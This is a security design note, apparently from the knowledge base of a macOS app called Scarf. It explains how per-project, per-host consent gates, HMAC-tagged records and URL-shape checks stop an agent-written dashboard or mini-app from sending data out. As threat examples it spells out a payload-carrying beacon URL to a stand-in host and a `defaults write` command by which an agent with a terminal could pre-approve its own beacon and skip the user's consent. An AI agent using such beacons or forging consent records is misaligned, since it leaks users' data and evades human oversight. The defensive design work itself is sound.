---
title: Remote image widgets are a per-(project, host) beacon gate stored outside the agent's reach
type: note
permalink: scarf/decisions/remote-image-widgets-are-a-per-project-host-beacon-gate
tags: [security, projects, widgets, consent]
source_paths: [scarf/Packages/ScarfCore/Sources/ScarfCore/Services/ImageHostConsentStore.swift, scarf/scarf/Features/Projects/Views/Widgets/ImageWidgetView.swift, scarf/Packages/ScarfCore/Sources/ScarfCore/Services/MiniAppOpenURLPolicy.swift, scarf/scarf/Features/Projects/MiniApp/ScarfMiniAppBridge.swift]
source_paths_inferred: false
source_sha: 2c964c9894ab73b47b209b5a0395e07b7250a847
created: 2026-09-04
updated: 2026-09-04
---

P8 SEC-M4. An image widget in `.scarf/dashboard.json` fires its request the moment the dashboard renders — no click, no chrome, nothing to decline — and the dashboard re-renders on every watcher tick. `dashboard.json` is agent-written, so the widget was a beacon the agent aimed: `https://x.example/p.png?d=<payload>` is a repeated GET from the user's machine and network, reporting their IP, to a host the user never chose. The earlier https-only restriction closed the `file://` read and the plaintext channel but could not close this, because a remote image IS a request.

The gate had to be stored somewhere the asker cannot write, which rules out every candidate under `~/.hermes` — the project's `.scarf/`, the registry directory, a sidecar beside the grants file. Same reasoning that put the mini-app grant key in the Keychain and made grants per-machine.

## Observations
- [decision] First render of a remote image host shows a placeholder naming the host plus an Allow button; nothing is fetched until the user presses it, and local/project-contained images (resolved by WidgetPathResolver) never reach the gate #security
- [decision] Consent is keyed (project root, normalized host) — per host so an agent cannot re-ask its way through by changing the PATH, and per project so blessing one dashboard says nothing about another's #security
- [decision] Stored in UserDefaults (ImageHostConsentStore) rather than any file under ~/.hermes: every on-disk candidate is writable by the agent whose dashboard is doing the asking, and a consent record the asker can write is not a consent record #decision
- [constraint] Host-level consent is deliberately coarser than URL-level: once a host is allowed, an agent can vary the PATH and query of requests to it. URL-level would re-prompt on every legitimate image change, which trains the user to click through #gotcha
- [constraint] Hosts are normalized (lowercased, trailing dot stripped) so EXAMPLE.com. and example.com are one decision rather than two chances to ask #constraint

## Relations
- relates_to [[Integrity is not authenticity: agent-writable Scarf sidecars need a Keychain-held MAC]]


## F1: the carrier was never the gate — records are HMAC-tagged

The original note justified `UserDefaults` as "the app's own container,
unlike every candidate inside `~/.hermes`". That reasoning does not survive
an agent with a terminal:
`defaults write <bundle> com.scarf.imageWidget.allowedHosts.<path> -array
evil.example` pre-approves the beacon and the card never appears. Harder to
reach is not out of reach, and the party being gated could write the gate's
answer.

**Fix.** Each record is HMAC-SHA256-tagged with the machine key
`MiniAppGrantSigner` already mints and holds in the login Keychain, over
`(version, projectId, host)`. A record whose tag is missing, wrong, minted
for another project, or unverifiable (no key) is not a record: it is
ignored, the card returns, the user is asked. `UserDefaults` stays the
carrier — it just stopped being trusted. Stored as
`<host>\u{1F}<tag>`; a legitimate allow/revoke rewrites from the VERIFIED
set, so poisoned neighbours are dropped rather than carried forward.

- [decision] The image gate borrows the grants signer's key rather than
  minting a second one. Same problem twice (a record of what a person
  agreed to, stored where the asker can write), same answer; a second key
  doubles the surface, the failure modes and the re-ask events for nothing.
  `MiniAppGrantSigner.tag(forPayload:)` / `isValidTag(_:forPayload:)`
  expose it, domain-separated with a fixed `scarf-detached-v1` prefix so a
  detached tag can never be replayed as a grant tag or vice versa.
- [gotcha] `consentProjectId` used to fall back to `""` for a nil project
  root, which put every rootless surface in ONE shared allowlist bucket —
  allow a host anywhere, allow it everywhere. There is no honest owner for
  such a record, so a nil root now REFUSES remote images outright instead
  of asking about them.
- [constraint] Consent is still keyed by project PATH, so a registry row
  rewritten onto a previously-blessed path inherits its allowlist. Closing
  that needs a stable project uuid on the widget surface, which the
  dashboard environment doesn't carry today; the payload is composed so the
  id can be swapped for a uuid without a format change.


## The same gate, reused: `open_url` (t-7e98ca69)

Mini-apps had no way out of the sandbox: navigation is locked to
`scarf-miniapp://`, so an agent-written `<a href="https://…">` was a dead
click (the news-tracker article browser shipped exactly that). Feature A
adds a declarable permission `open_url` + `scarf.openURL(url)` (bridge
1.1), and the destination question is THIS gate again — a per-(project,
host) record of what a person agreed to, kept where the party asking can
write — so it reuses `ImageHostConsentStore` rather than forking a store.

- [decision] `ImageHostConsentStore.Purpose` (`.remoteImage` / `.openURL`)
  picks BOTH the defaults key prefix and the signed payload version, so the
  two record sets are separate and a tag cannot be replayed across them:
  blessing an image host never blesses opening links to it #security
- [decision] `open_url` is NON-sensitive (default-ticked on the consent
  sheet). It reads nothing, and the grant only buys the right to ASK — every
  new host is confirmed by name ("Open example.com in your browser?" / Open
  Once / Always Allow / Cancel) with the full URL shown. A warning row that
  changes no outcome would only teach users to tick warnings #decision
- [decision] Three gates in order: the grant (preflight), the SHAPE
  (`MiniAppOpenURLPolicy`: https only, no userinfo — `apple.com@evil.example`
  is refused — ASCII `[a-z0-9.-]` host, ≤2048 chars, no Cc/Cf characters), and
  the user's per-host answer. Nothing is repaired; a URL we half-understand
  can't be described honestly in the confirmation #security
- [gotcha] A Unicode host is NOT refused — `URL` punycodes it, so the
  confirmation reads `xn--pple-43d.com` instead of `аpple.com`. The
  homograph announces itself; refusing would have been worse UX for no gain #security
- [constraint] Accepted leak: the path and query DO travel to the host on
  the user's click, so a mini-app can encode a message in a link the user
  chooses to follow. That is what any rendered anchor does, the URL is shown
  before it opens, and restricting it would break ordinary links. Documented
  in the author skill as "don't smuggle project data into a link" #gotcha
- [decision] It can never auto-fire usefully: a load-time call lands on the
  same confirmation, calls are rate-limited (5/min, `MiniAppRateLimiter`,
  counted even for already-allowed hosts), and only ONE confirmation may be
  pending — further calls are refused (`user_denied`), never queued, so a
  loop cannot stack modal sheets over the user's window #security
- [gotcha] The alert interpolates the mini-app id, which is a directory name
  in an agent-writable folder; it goes through `MiniAppPermission.displaySafe`
  so an app cannot name itself into a second sentence and reframe the
  question. The reply is also settled when the bridge dies mid-sheet
  (deallocation = "no"), or the page's `await` hangs forever #gotcha
- [constraint] macOS only. `ScarfIOS`/"scarf mobile" hosts no mini-apps (no
  bridge, no host view — only a comment referencing `MiniAppAgentSession`),
  so there is nothing to mirror with `UIApplication.open` yet; whoever ports
  the mini-app host to iOS owns this surface too #constraint
